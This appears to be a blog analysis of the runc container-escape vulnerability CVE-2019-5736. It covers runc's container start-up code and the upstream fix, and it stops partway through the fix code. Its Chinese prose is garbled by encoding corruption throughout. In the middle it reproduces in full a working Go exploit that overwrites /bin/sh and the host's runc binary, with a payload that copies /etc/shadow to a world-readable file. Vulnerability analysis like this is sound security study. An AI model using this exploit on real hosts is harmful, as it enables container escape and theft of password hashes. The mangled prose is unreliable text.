# Docker runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬ä¸‰ç‰ˆ


å¤§æ¦‚ä¸€å‘¨å‰ï¼ŒEricè®¤ä¸ºæˆ‘å†™çš„è¿™ç¯‡æ–‡æ¡£å¤ªåƒäº†ï¼Œæˆ‘ä»”ç»†è¯»äº†ä¸€éï¼Œå‘ç°ç¡®å®å†™çš„æŒºæ··ä¹±çš„ï¼Œè¿˜æ— æ³•åšåˆ°ä¼ è¾¾ç›¸å…³çŸ¥è¯†ç»™ä¸äº†è§£è¿™ä¸€æ¼æ´çš„äººã€‚å¸Œæœ›è¿™ç¬¬ä¸‰ç‰ˆè‡³å°‘èƒ½å¤Ÿè®©å°†æ¥çš„è‡ªå·±çœ‹å¾—æ‡‚å§ğŸ¤

<!--more-->

## æ¼æ´èƒŒæ™¯
[**runc**](https://github.com/opencontainers/runc)æ˜¯ä¸€ä¸ªæ ¹æ®OCI(Open Container Initiative)æ ‡å‡†åˆ›å»ºå¹¶è¿è¡Œå®¹å™¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œæ˜¯Dockerçš„åº•å±‚å®¹å™¨è¿è¡Œæ—¶ã€‚

[**CVE-2019-5736**](https://nvd.nist.gov/vuln/detail/CVE-2019-5736)æ˜¯ç”±æ³¢å…°çš„ä¸€æ”¯ctfæˆ˜é˜ŸDragon Sectoråœ¨2019å‘ç°çš„å…³äºruncçš„æ¼æ´ã€‚èµ·å› æ˜¯ä»–ä»¬åœ¨å‚åŠ ä¸€åœºctfæ¯”èµ›ä¹‹åï¼Œå‘ç°æ¯”èµ›ä¸­çš„ä¸€é“æ²™ç®±é€ƒé€¸é¢˜çš„åŸç†ä¸runcçš„å®ç°åŸç†ç±»ä¼¼ã€‚åœ¨è¿™ä¹‹åä»–ä»¬å¯¹runcè¿›è¡Œäº†ç›¸å…³çš„æ¼æ´æŒ–æ˜å·¥ä½œï¼Œå¹¶ä¸”æˆåŠŸå‘ç°äº†runcä¸­å­˜åœ¨çš„èƒ½å¤Ÿè¢«ç”¨æ¥è¦†ç›–å®¿ä¸»æœºä¸Šruncæ–‡ä»¶çš„å®¹å™¨é€ƒé€¸æ¼æ´ï¼Œè¯¥æ¼æ´çš„CVEç¼–å·ä¸º**CVE-2019-5736**ã€‚

åˆ©ç”¨è¯¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹å®¹å™¨å†…å¯æ‰§è¡Œæ–‡ä»¶çš„æ–¹å¼ï¼Œè·å–åˆ°å®¿ä¸»æœºä¸Šruncå¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶å¥æŸ„ï¼Œç„¶åè¿›è¡Œè¦†ç›–æ“ä½œï¼Œå°†runcæ›¿æ¢ä¸ºå¯æ§çš„æ¶æ„æ–‡ä»¶ã€‚æœ€ç»ˆå¯é€ æˆåœ¨å®¿ä¸»æœºä¸Šä»¥rootæƒé™æ‰§è¡Œä»»æ„ä»£ç çš„ä¸¥é‡åæœï¼Œå®ç°å®¹å™¨é€ƒé€¸ã€‚

æœ‰å…³è¯¥æ¼æ´çš„è¯¦ç»†å™è¿°å¯è§æ¼æ´çš„[oss-securityå‘å¸ƒé‚®ä»¶](https://www.openwall.com/lists/oss-security/2019/02/11/2)ä¸[dragon sectorçš„å®˜æ–¹åšå®¢](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)ã€‚

> å½±å“ç‰ˆæœ¬ï¼šrunc <= 1.0-rc6

## æ¼æ´æˆå› 

è¯¥æ¼æ´çš„äº§ç”Ÿä¸»è¦å’ŒLinuxçš„[`pid`å‘½åç©ºé—´](https://man7.org/linux/man-pages/man7/pid_namespaces.7.html)ä¸[`/proc`ä¼ªæ–‡ä»¶ç³»ç»Ÿ](https://man7.org/linux/man-pages/man5/proc.5.html)ç›¸å…³ã€‚

å½“ä¸€ä¸ªè¿›ç¨‹åŠ å…¥äº†æŸä¸€pidå‘½åç©ºé—´ä¹‹åï¼Œè¯¥å‘½åç©ºé—´ä¸­çš„å…¶å®ƒè¿›ç¨‹å°±èƒ½å¤Ÿé€šè¿‡`/proc`æ–‡ä»¶ç³»ç»Ÿè§‚å¯Ÿåˆ°è¯¥è¿›ç¨‹ï¼Œåœ¨æƒé™å…è®¸çš„æƒ…å†µä¸‹ï¼Œè¿›ç¨‹èƒ½å¤Ÿé€šè¿‡`/proc/[pid]/exe`æ‰¾åˆ°å…¶å®ƒè¿›ç¨‹å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚

è€Œå¦‚æœå°†è¿™ç§æƒ…å†µæ”¾åˆ°`runc init`æ‰§è¡Œè¿‡ç¨‹ä¸­æ¥çœ‹ï¼Œ`runc init`è¿›ç¨‹åœ¨è¿›å…¥äº†å®¹å™¨çš„å‘½åç©ºé—´ä¹‹åï¼Œå¦‚æœå®¹å™¨å†…éƒ¨çš„æ–‡ä»¶èƒ½å¤Ÿæ¬ºéª—`runc init`è¿›ç¨‹æ‰§è¡Œè‡ªèº«ï¼Œé‚£ä¹ˆå®¹å™¨å†…çš„è¿›ç¨‹å°±èƒ½å¤Ÿé€šè¿‡`/proc`è·å–åˆ°å®¿ä¸»æœºä¸Šçš„runcæ–‡ä»¶å¥æŸ„ï¼Œä»è€Œè¿›è¡Œè¦†ç›–ç­‰æ”»å‡»æ“ä½œã€‚

æ­£å¸¸çš„åˆ›å»ºå®¹å™¨å¹¶åœ¨å®¹å™¨å†…æ‰§è¡Œå‘½ä»¤çš„è¿‡ç¨‹ç¤ºæ„å›¾å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆå…·ä½“æµç¨‹è§ä¸‹æ–‡ä»£ç åˆ†æï¼‰ã€‚

![æ­£å¸¸æµç¨‹](runc1.png)

è€Œä¿®æ”¹äº†å¾…æ‰§è¡Œæ–‡ä»¶çš„å†…å®¹ä¹‹åï¼Œ`runc init`è¿›ç¨‹ä¼šæ‰§è¡Œè‡ªèº«ï¼Œä»è€Œå°†å®¿ä¸»æœºä¸Šçš„runcæ–‡ä»¶æš´éœ²ç»™äº†å®¹å™¨å†…éƒ¨ï¼Œé€ æˆå®‰å…¨é£é™©ã€‚

![è¢«æ”»å‡»](runc2.png)


### å…·ä½“ä»£ç åˆ†æ

#### runcå¯åŠ¨å®¹å™¨çš„è¿‡ç¨‹

`runc run`å¯¹åº”çš„commandåœ¨[run.go](https://github.com/opencontainers/runc/blob/master/run.go)ä¸­è¢«å®šä¹‰

```go
// default action is to start a container
var runCommand = cli.Command{
    Name:  "run",
    Usage: "create and run a container",
    ...
    Action: func(context *cli.Context) error {
        if err := checkArgs(context, 1, exactArgs); err != nil {
            return err
        }
        status, err := startContainer(context, CT_ACT_RUN, nil)
        if err == nil {
            // exit with the container's exit status so any external supervisor is
            // notified of the exit with the correct exit status.
            os.Exit(status)
        }
        return fmt.Errorf("runc run failed: %w", err)
    },
}
```
å¯¹åº”çš„`Action`ä¼šæ‰§è¡Œ[`startContainer()`](https://github.com/opencontainers/runc/blob/master/utils_linux.go#L398-L456)å‡½æ•°ã€‚è¯¥å‡½æ•°ä¼šè¯»å–å®¹å™¨é…ç½®æ–‡ä»¶`config.json`çš„ä¿¡æ¯ï¼Œç”Ÿæˆ`spec`å¯¹è±¡ï¼Œå†å°†å…¶ä½œä¸ºå‚æ•°é€šè¿‡`createContainer()`ç”Ÿæˆ`container`å¯¹è±¡ã€‚é€šè¿‡åŒ…å«`container`å¯¹è±¡çš„`runner`å¯¹è±¡è°ƒç”¨`r.run()`å¯åŠ¨å®¹å™¨ã€‚

```go
func startContainer(context *cli.Context, action CtAct, criuOpts *libcontainer.CriuOpts) (int, error) {
    if err := revisePidFile(context); err != nil {
        return -1, err
    }
    //è¯»å–é…ç½®æ–‡ä»¶ï¼Œè·å–é…ç½®ä¿¡æ¯
    spec, err := setupSpec(context)
    if err != nil {
        return -1, err
    }

    id := context.Args().First()
    if id == "" {
        return -1, errEmptyID
    }

    notifySocket := newNotifySocket(context, os.Getenv("NOTIFY_SOCKET"), id)
    if notifySocket != nil {
        if err := notifySocket.setupSpec(context, spec); err != nil {
            return -1, err
        }
    }
    //ä¼ å…¥é…ç½®å‚æ•°ï¼Œåˆ›å»ºcontainerå¯¹è±¡
    container, err := createContainer(context, id, spec)
    if err != nil {
        return -1, err
    }

    if notifySocket != nil {
        if err := notifySocket.setupSocketDirectory(); err != nil {
            return -1, err
        }
        if action == CT_ACT_RUN {
            if err := notifySocket.bindSocket(); err != nil {
                return -1, err
            }
        }
    }

    // Support on-demand socket activation by passing file descriptors into the container init process.
    listenFDs := []*os.File{}
    if os.Getenv("LISTEN_FDS") != "" {
        listenFDs = activation.Files(false)
    }

    r := &runner{
        enableSubreaper: !context.Bool("no-subreaper"),
        shouldDestroy:   !context.Bool("keep"),
        container:       container,
        listenFDs:       listenFDs,
        notifySocket:    notifySocket,
        consoleSocket:   context.String("console-socket"),
        detach:          context.Bool("detach"),
        pidFile:         context.String("pid-file"),
        preserveFDs:     context.Int("preserve-fds"),
        action:          action,
        criuOpts:        criuOpts,
        init:            true,
    }
    return r.run(spec.Process)
}
```

`r.run()`å¯¹åº”äºå®šä¹‰åœ¨[utils_linux.go](https://github.com/opencontainers/runc/blob/master/utils_linux.go)ä¸­çš„[`run()`](https://github.com/opencontainers/runc/blob/master/utils_linux.go#L260-L346)ã€‚ä¹‹å‰ä¼ å…¥çš„`action`å€¼ä¸º`CT_ACT_RUN`ï¼Œå› æ­¤è¿™é‡Œå°†ä¼šæ‰§è¡Œ`r.container.Run(process)`ã€‚
```go
//runc runå‘½ä»¤å¯¹åº”çš„action
    Action: func(context *cli.Context) error {
        ...
        //ä¼ å…¥actionå‚æ•°ä¸ºCT_ACT_RUN
        status, err := startContainer(context, CT_ACT_RUN, nil)
        ...
```

```go
func (r *runner) run(config *specs.Process) (int, error) {
    ...
    //æ ¹æ®configåˆ›å»ºprocess
    process, err := newProcess(*config)
    if err != nil {
        return -1, err
    }
    process.LogLevel = strconv.Itoa(int(logrus.GetLevel()))
    // Populate the fields that come from runner.
    process.Init = r.init //r.initä¸º true
    ...
    //r.actionæ­¤æ—¶ä¸ºCT_ACT_RUN
    switch r.action {
    case CT_ACT_CREATE:
        err = r.container.Start(process)
    case CT_ACT_RESTORE:
        err = r.container.Restore(process, r.criuOpts)
    case CT_ACT_RUN:
        //è°ƒç”¨è¯¥æ–¹æ³•
        err = r.container.Run(process)
    default:
        panic("Unknown action")
    }
    ...
}
```

`r.container`ç”±`createContainer()`å‡½æ•°åˆ›å»ºï¼Œæ ¹æ®`createContainer()->loadFactory()->factory.Create()`çš„è°ƒç”¨é“¾å¯çŸ¥ï¼Œ`r.container`æœ€ç»ˆæ˜¯ç”±[`LinuxFactory.Create()`](https://github.com/opencontainers/runc/blob/master/libcontainer/factory_linux.go#L251-L292)æ‰€åˆ›å»ºã€‚æ‰€ä»¥`r.container.Run()`å°†ä¼šè°ƒç”¨[`LinuxContainer.Run()`](https://github.com/opencontainers/runc/blob/master/libcontainer/container_linux.go#L248-L256)ï¼Œ`Run()`åŒ…å«äº†æ•´ä¸ªå®¹å™¨çš„å¯åŠ¨é€»è¾‘ã€‚
```go
func (l *LinuxFactory) Create(id string, config *configs.Config) (Container, error) {
    ...
    c := &linuxContainer{
        id:            id,                 //å®¹å™¨id
        root:          containerRoot,      
        config:        config,
        initPath:      l.InitPath,
        initArgs:      l.InitArgs,
        criuPath:      l.CriuPath,
        newuidmapPath: l.NewuidmapPath,
        newgidmapPath: l.NewgidmapPath,
        cgroupManager: l.NewCgroupsManager(config.Cgroups, nil),
    }
    if l.NewIntelRdtManager != nil {
        c.intelRdtManager = l.NewIntelRdtManager(config, id, "")
    }
    c.state = &stoppedState{c: c}
    return c, nil
}
```

```go
func (c *linuxContainer) Run(process *Process) error {
    if err := c.Start(process); err != nil {
        return err
    }
    if process.Init {
        return c.exec()
    }
    return nil
}
```

`Run()`çš„è°ƒç”¨é“¾ä¸º`linuxContainer.Run()->linuxContainer.Start()->linuxContainer.start()`ã€‚`Run()`/`Start()`éƒ½æ˜¯å°è£…çš„linuxContainerå¯¼å‡ºå‡½æ•°ï¼Œè€ŒçœŸæ­£çš„æ‰§è¡Œè¿‡ç¨‹åœ¨[`start()`](https://github.com/opencontainers/runc/blob/master/libcontainer/container_linux.go#L336-L375)ä¸­ã€‚

`start()`å‡½æ•°è°ƒç”¨`newParentProcess()`åˆ›å»ºçˆ¶è¿›ç¨‹å¯¹è±¡`parent`ï¼Œå¹¶è°ƒç”¨`parent.start()`å¯åŠ¨å­è¿›ç¨‹ã€‚

```go
func (c *linuxContainer) start(process *Process) (retErr error) {
    //åˆ›å»ºparentå¯¹è±¡
    parent, err := c.newParentProcess(process)
    if err != nil {
        return fmt.Errorf("unable to create new parent process: %w", err)
    }

    logsDone := parent.forwardChildLogs()
    if logsDone != nil {
        defer func() {
            // Wait for log forwarder to finish. This depends on
            // runc init closing the _LIBCONTAINER_LOGPIPE log fd.
            err := <-logsDone
            if err != nil && retErr == nil {
                retErr = fmt.Errorf("unable to forward init logs: %w", err)
            }
        }()
    }
    //å¯åŠ¨å­è¿›ç¨‹
    if err := parent.start(); err != nil {
        return fmt.Errorf("unable to start container process: %w", err)
    }

    if process.Init {
        c.fifo.Close()
        if c.config.Hooks != nil {
            s, err := c.currentOCIState()
            if err != nil {
                return err
            }

            if err := c.config.Hooks[configs.Poststart].RunHooks(s); err != nil {
                if err := ignoreTerminateErrors(parent.terminate()); err != nil {
                    logrus.Warn(fmt.Errorf("error running poststart hook: %w", err))
                }
                return err
            }
        }
    }
    return nil
}
```
å…¶ä¸­ï¼Œ[`newParentProcess()`](https://github.com/opencontainers/runc/blob/master/libcontainer/container_linux.go#L455-L482)é¦–å…ˆåˆ›å»ºäº†çˆ¶å­è¿›ç¨‹ä¹‹é—´é€šä¿¡çš„ç®¡é“ï¼Œç„¶åè°ƒç”¨[`commandTemplate()`](https://github.com/opencontainers/runc/blob/master/libcontainer/container_linux.go#L484-L521)é…ç½®å­è¿›ç¨‹çš„å‘½ä»¤ä¸º`runc init`ï¼Œå¹¶å°†ç®¡é“æ–‡ä»¶ä¼ ç»™å­è¿›ç¨‹ï¼Œè®©å…¶å¯ä»¥ä¸çˆ¶è¿›ç¨‹é€šä¿¡ã€‚
```go
func (c *linuxContainer) newParentProcess(p *Process) (parentProcess, error) {
    //åˆ›å»ºç®¡é“æ–‡ä»¶ï¼Œç®¡é“çš„ä¸¤ç«¯ parent/child åˆ†åˆ«ä¾›çˆ¶å­è¿›ç¨‹ä½¿ç”¨
    parentInitPipe, childInitPipe, err := utils.NewSockPair("init")
    if err != nil {
        return nil, fmt.Errorf("unable to create init pipe: %w", err)
    }
    messageSockPair := filePair{parentInitPipe, childInitPipe}

    parentLogPipe, childLogPipe, err := os.Pipe()
    if err != nil {
        return nil, fmt.Errorf("unable to create log pipe: %w", err)
    }
    logFilePair := filePair{parentLogPipe, childLogPipe}
    //å†™å…¥å­è¿›ç¨‹çš„å‘½ä»¤
    cmd := c.commandTemplate(p, childInitPipe, childLogPipe)
    if !p.Init {
        return c.newSetnsProcess(p, cmd, messageSockPair, logFilePair)
    }

    // We only set up fifoFd if we're not doing a `runc exec`. The historic
    // reason for this is that previously we would pass a dirfd that allowed
    // for container rootfs escape (and not doing it in `runc exec` avoided
    // that problem), but we no longer do that. However, there's no need to do
    // this for `runc exec` so we just keep it this way to be safe.
    if err := c.includeExecFifo(cmd); err != nil {
        return nil, fmt.Errorf("unable to setup exec fifo: %w", err)
    }
    return c.newInitProcess(p, cmd, messageSockPair, logFilePair)
}
```

```go
func (c *linuxContainer) commandTemplate(p *Process, childInitPipe *os.File, childLogPipe *os.File) *exec.Cmd {
    //initPath: "/proc/self/exe"
    //initArgs: ["runc", "init"]
    cmd := exec.Command(c.initPath, c.initArgs[1:]...)
    cmd.Args[0] = c.initArgs[0]
    cmd.Stdin = p.Stdin
    cmd.Stdout = p.Stdout
    cmd.Stderr = p.Stderr
    cmd.Dir = c.config.Rootfs
    if cmd.SysProcAttr == nil {
        cmd.SysProcAttr = &unix.SysProcAttr{}
    }
    cmd.Env = append(cmd.Env, "GOMAXPROCS="+os.Getenv("GOMAXPROCS"))
    cmd.ExtraFiles = append(cmd.ExtraFiles, p.ExtraFiles...)
    if p.ConsoleSocket != nil {
        cmd.ExtraFiles = append(cmd.ExtraFiles, p.ConsoleSocket)
        cmd.Env = append(cmd.Env,
            "_LIBCONTAINER_CONSOLE="+strconv.Itoa(stdioFdCount+len(cmd.ExtraFiles)-1),
        )
    }
    //ä¼ å…¥ç”¨äºé€šä¿¡çš„ç®¡é“æ–‡ä»¶
    cmd.ExtraFiles = append(cmd.ExtraFiles, childInitPipe)
    cmd.Env = append(cmd.Env,
        "_LIBCONTAINER_INITPIPE="+strconv.Itoa(stdioFdCount+len(cmd.ExtraFiles)-1),
        "_LIBCONTAINER_STATEDIR="+c.root,
    )

    cmd.ExtraFiles = append(cmd.ExtraFiles, childLogPipe)
    cmd.Env = append(cmd.Env,
        "_LIBCONTAINER_LOGPIPE="+strconv.Itoa(stdioFdCount+len(cmd.ExtraFiles)-1),
        "_LIBCONTAINER_LOGLEVEL="+p.LogLevel,
    )

    // NOTE: when running a container with no PID namespace and the parent process spawning the container is
    // PID1 the pdeathsig is being delivered to the container's init process by the kernel for some reason
    // even with the parent still running.
    if c.config.ParentDeathSignal > 0 {
        cmd.SysProcAttr.Pdeathsig = unix.Signal(c.config.ParentDeathSignal)
    }
    return cmd
}
```
```go
    l := &LinuxFactory{
        Root:      root,
        InitPath:  "/proc/self/exe",
        InitArgs:  []string{os.Args[0], "init"}, //runc init
        Validator: validate.New(),
        CriuPath:  "criu",
    }
```
å®Œæˆè¿™äº›æ­¥éª¤ä¹‹åï¼Œ`newParentProcess()`è¿”å›[`initProcess`](https://github.com/opencontainers/runc/blob/master/libcontainer/process_linux.go#L300-L312)ç±»å‹çš„å¯¹è±¡`parent`ï¼Œç„¶åè°ƒç”¨`parent.start()`å¯åŠ¨`runc init`å­è¿›ç¨‹ï¼Œå¹¶ä¸”ç­‰å¾…å…¶æ‹‰èµ·å®¹å™¨å¹¶é€€å‡ºã€‚
```go
func (p *initProcess) start() (retErr error) {
    defer p.messageSockPair.parent.Close() //nolint: errcheck
    //ç›¸å½“äºæ‰§è¡Œrunc initå‘½ä»¤ï¼Œå¯åŠ¨runc initå­è¿›ç¨‹
    err := p.cmd.Start()
    ...
    //å°†bootstrapDataå†™å…¥åˆ°ç®¡é“æ–‡ä»¶ä¸­ï¼Œå­è¿›ç¨‹å¯ä»¥é€šè¿‡childç«¯è¯»å–
    if _, err := io.Copy(p.messageSockPair.parent, p.bootstrapData); err != nil {
        return fmt.Errorf("can't copy bootstrap data to pipe: %w", err)
    }
    ...
    //å‘runc initå­è¿›ç¨‹å‘é€å®¹å™¨çš„é…ç½®ä¿¡æ¯
    if err := p.sendConfig(); err != nil {
        return fmt.Errorf("error sending config to init process: %w", err)
    }
    var (
        sentRun    bool
        sentResume bool
    )

    //ä»ç®¡é“çš„parentç«¯è¯»å–runc initå­è¿›ç¨‹å‘é€çš„åŒæ­¥ä¿¡æ¯
    ierr := parseSync(p.messageSockPair.parent, func(sync *syncT) error {
        ...
    })
    ...
    return nil
}
```
åˆ°è¿™é‡Œï¼Œ`runc run`çš„æ‰§è¡ŒåŸºæœ¬ç»“æŸï¼Œå®ƒå·²ç»å®Œæˆäº†è¯»å–config.jsonæ–‡ä»¶ã€åˆ›å»ºä¼ é€’ä¿¡æ¯çš„å„ç±»å¯¹è±¡ã€å¯åŠ¨runc initå­è¿›ç¨‹ç­‰æ“ä½œï¼Œå¹¶ä¸”å·²ç»åœ¨ç­‰å¾…runc initå­è¿›ç¨‹çš„é€€å‡ºã€‚

æ¥ä¸‹æ¥å°±è¿›å…¥åˆ°äº†`runc init`çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œè¿™ä¹Ÿæ˜¯å®é™…å®Œæˆå¯åŠ¨å®¹å™¨è¿›ç¨‹çš„æ‰§è¡Œè¿‡ç¨‹ã€‚

`runc init`å‘½ä»¤å¯¹åº”çš„å‡½æ•°ä¸º[`init()`](https://github.com/opencontainers/runc/blob/master/init.go)ã€‚
```go
package main

import (
    "os"
    "runtime"
    "strconv"

    "github.com/opencontainers/runc/libcontainer"
    //åŒ¿åå¼•å…¥nsenteråŒ…
    _ "github.com/opencontainers/runc/libcontainer/nsenter"
    "github.com/sirupsen/logrus"
)

func init() {
    //è¿™é‡Œ os.Args[1] == "init" åŒ¹é… "runc init" å‘½ä»¤
    if len(os.Args) > 1 && os.Args[1] == "init" {
        // This is the golang entry point for runc init, executed
        // before main() but after libcontainer/nsenter's nsexec().
        ...
        factory, _ := libcontainer.New("")
        if err := factory.StartInitialization(); err != nil {
            // as the error is sent back to the parent there is no need to log
            // or write it to stderr because the parent process will handle this
            os.Exit(1)
        }
        panic("libcontainer: container init failed to exec")
    }
}
```
å…¶ä¸­å¼•å…¥äº†`nsenter`åŒ…ï¼Œç”±äºCGOçš„ç‰¹æ€§ï¼Œ`nsenter`ä¸­çš„[`nsexec()`](https://github.com/opencontainers/runc/blob/master/libcontainer/nsenter/nsexec.c#L636-L1144)å‡½æ•°ä¼šé¦–å…ˆè¢«æ‰§è¡Œï¼Œå®ƒä¸»è¦å®Œæˆè¿›å…¥å‘½åç©ºé—´çš„æ“ä½œï¼Œè¿™ä¹Ÿæ˜¯åç»­çš„æ¼æ´ä¿®å¤ä»£ç è¢«å¼•å…¥çš„ä½ç½®ã€‚
```cpp
void nsexec(void)
{
    int pipenum;
    jmp_buf env;
    int sync_child_pipe[2], sync_grandchild_pipe[2];
    struct nlconfig_t config = { 0 };
    ...
    /*
     * Get the init pipe fd from the environment. The init pipe is used to
     * read the bootstrap data and tell the parent what the new pids are
     * after the setup is done.
     */
    //è·å–ç®¡é“æ–‡ä»¶ï¼Œè¯»å–namespacesä¿¡æ¯
    pipenum = getenv_int("_LIBCONTAINER_INITPIPE");
    if (pipenum < 0) {
        /* We are not a runc init. Just return to go runtime. */
        return;
    }
    ...
    /* Parse all of the netlink configuration. */
    //ä»pipeè¯»å–å®¹å™¨é…ç½®ä¿¡æ¯
    nl_parse(pipenum, &config);
    ...
    current_stage = setjmp(env);
    switch (current_stage) {
        /*
         * Stage 0: We're in the parent. Our job is just to create a new child
         *          (stage 1: STAGE_CHILD) process and write its uid_map and
         *          gid_map. That process will go on to create a new process, then
         *          it will send us its PID which we will send to the bootstrap
         *          process.
         */
    case STAGE_PARENT:{
        ...
        }
        break;

        /*
         * Stage 1: We're in the first child process. Our job is to join any
         *          provided namespaces in the netlink payload and unshare all of
         *          the requested namespaces. If we've been asked to CLONE_NEWUSER,
         *          we will ask our parent (stage 0) to set up our user mappings
         *          for us. Then, we create a new child (stage 2: STAGE_INIT) for
         *          PID namespace. We then send the child's PID to our parent
         *          (stage 0).
         */
    case STAGE_CHILD:{
            ...
            /*
             * We need to setns first. We cannot do this earlier (in stage 0)
             * because of the fact that we forked to get here (the PID of
             * [stage 2: STAGE_INIT]) would be meaningless). We could send it
             * using cmsg(3) but that's just annoying.
             */
            //åŠ å…¥å‘½åç©ºé—´
            if (config.namespaces)
                join_namespaces(config.namespaces);
            ...
        }
        break;

        /*
         * Stage 2: We're the final child process, and the only process that will
         *          actually return to the Go runtime. Our job is to just do the
         *          final cleanup steps and then return to the Go runtime to allow
         *          init_linux.go to run.
         */
    case STAGE_INIT:{
        ...
        }
        break;
    default:
        bail("unknown stage '%d' for jump value", current_stage);
    }

```

`StartInitialization()`ä»ç¯å¢ƒå˜é‡`_LIBCONTAINER_INITPIPE`è·å–ç®¡é“æ–‡ä»¶ï¼Œå¹¶åˆ›å»º`linuxStandard`ç±»å‹çš„å¯¹è±¡ï¼Œè°ƒç”¨`r.Init()`è¿›è¡Œå®¹å™¨åˆå§‹åŒ–å·¥ä½œã€‚

```go
func (l *LinuxFactory) StartInitialization() (err error) {
    // Get the INITPIPE.
    // ä»ç¯å¢ƒå˜é‡è·å–ç®¡é“æ–‡ä»¶
    envInitPipe := os.Getenv("_LIBCONTAINER_INITPIPE")
    pipefd, err := strconv.Atoi(envInitPipe)
    if err != nil {
        err = fmt.Errorf("unable to convert _LIBCONTAINER_INITPIPE: %w", err)
        logrus.Error(err)
        return err
    }
    pipe := os.NewFile(uintptr(pipefd), "pipe")
    defer pipe.Close()
    ...
    i, err := newContainerInit(it, pipe, consoleSocket, fifofd, logPipeFd)
    if err != nil {
        return err
    }

    // If Init succeeds, syscall.Exec will not return, hence none of the defers will be called.
    return i.Init()
    
```

```go
func (l *linuxStandardInit) Init() error {
    ...
    //è®¾ç½®ç½‘ç»œ
    if err := setupNetwork(l.config); err != nil {
        return err
    }
    //è®¾ç½®è·¯ç”±
    if err := setupRoute(l.config.Config); err != nil {
        return err
    }

    // initialises the labeling system
    selinux.GetEnabled()
    //åˆ‡æ¢ä¸ºå®¹å™¨å†…çš„æ–‡ä»¶ç³»ç»Ÿ
    if err := prepareRootfs(l.pipe, l.config); err != nil {
        return err
    }
    ...
    //æ›¿æ¢è‡ªèº«è¿›ç¨‹
    if err := system.Exec(name, l.config.Args[0:], os.Environ()); err != nil {
        return fmt.Errorf("can't exec user process: %w", err)
    }
    return nil
```

`Init()`å‡½æ•°ä¼šå®Œæˆå®¹å™¨çš„ç½‘ç»œè®¾ç½®ã€åˆ‡æ¢æ–‡ä»¶ç³»ç»Ÿç­‰æ“ä½œï¼Œæœ€åè°ƒç”¨`system.Exec()`æ›¿æ¢è‡ªèº«ã€‚è‡³æ­¤ï¼Œå®¹å™¨å¯åŠ¨æµç¨‹æ‰§è¡Œå®Œæ¯•ã€‚

#### pocä»£ç 

https://github.com/Frichetten/CVE-2019-5736-PoC

```go
package main

// Implementation of CVE-2019-5736
// Created with help from @singe, @_cablethief, and @feexd.
// This commit also helped a ton to understand the vuln
// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
import (
    "fmt"
    "io/ioutil"
    "os"
    "strconv"
    "strings"
)

// This is the line of shell commands that will execute on the host
var payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow"

func main() {
    // First we overwrite /bin/sh with the /proc/self/exe interpreter path
    fd, err := os.Create("/bin/sh")
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Fprintln(fd, "#!/proc/self/exe")
    err = fd.Close()
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Println("[+] Overwritten /bin/sh successfully")

    // Loop through all processes to find one whose cmdline includes runcinit
    // This will be the process created by runc
    var found int
    for found == 0 {
        pids, err := ioutil.ReadDir("/proc")
        if err != nil {
            fmt.Println(err)
            return
        }
        for _, f := range pids {
            fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
            fstring := string(fbytes)
            if strings.Contains(fstring, "runc") {
                fmt.Println("[+] Found the PID:", f.Name())
                found, err = strconv.Atoi(f.Name())
                if err != nil {
                    fmt.Println(err)
                    return
                }
            }
        }
    }

    // We will use the pid to get a file handle for runc on the host.
    var handleFd = -1
    for handleFd == -1 {
        // Note, you do not need to use the O_PATH flag for the exploit to work.
        handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
        if int(handle.Fd()) > 0 {
            handleFd = int(handle.Fd())
        }
    }
    fmt.Println("[+] Successfully got the file handle")

    // Now that we have the file handle, lets write to the runc binary and overwrite it
    // It will maintain it's executable flag
    for {
        writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
        if int(writeHandle.Fd()) > 0 {
            fmt.Println("[+] Successfully got write handle", writeHandle)
            writeHandle.Write([]byte(payload))
            return
        }
    }
}
```
## æ¼æ´ä¿®å¤

runcå›¢é˜Ÿåœ¨1.0.0-rc7çš„ç‰ˆæœ¬ä¸­å¢åŠ äº†è¯¥æ¼æ´çš„[è¡¥ä¸](https://github.com/opencontainers/runc/commit/0a8e4117e7f715d5fbeef398405813ce8e88558b)ï¼Œä¿®å¤æ¼æ´çš„æ–¹å¼æ˜¯åœ¨`runc init`è¿›ç¨‹è¿›å…¥åˆ°å®¹å™¨å‘½åç©ºé—´ä¹‹å‰ï¼Œå…ˆå°†`/proc/self/exe`ï¼ˆå³å®¿ä¸»æœºä¸Šçš„runcï¼‰å¤åˆ¶åˆ°å†…å­˜ä¸­ï¼Œç„¶åç”¨å¤åˆ¶äº§ç”Ÿçš„åŒ¿åæ–‡ä»¶æ›¿æ¢å½“å‰è¢«æ‰§è¡Œæ–‡ä»¶çš„å¥æŸ„ï¼Œè¿™æ ·å°±èƒ½å¤Ÿé˜²æ­¢å°†å®¿ä¸»æœºçš„runcæ–‡ä»¶æš´éœ²ç»™å®¹å™¨å†…éƒ¨çš„è¿›ç¨‹ã€‚

```cpp
void nsexec(void)
{
    ...
    /*
     * We need to re-exec if we are not in a cloned binary. This is necessary
     * to ensure that containers won't be able to access the host binary
     * through /proc/self/exe. See CVE-2019-5736.
     */
    if (ensure_cloned_binary() < 0)
        bail("could not ensure we are a cloned binary");
    ...
}
```

```cpp
int ensure_cloned_binary(void)
{
    int execfd;
    char **argv = NULL;

    /* Check that we're not self-cloned, and if we are then bail. */
    int cloned = is_self_cloned();
    if (cloned > 0 || cloned == -ENOTRECOVERABLE)
        return cloned;

    if (fetchve(&argv) < 0)
        return -EINVAL;
    //å¤åˆ¶åŒ¿åæ–‡ä»¶
    execfd = clone_binary();
    if (execfd < 0)
        return -EIO;

    if (putenv(CLONED_BINARY_ENV "=1"))
        goto error;
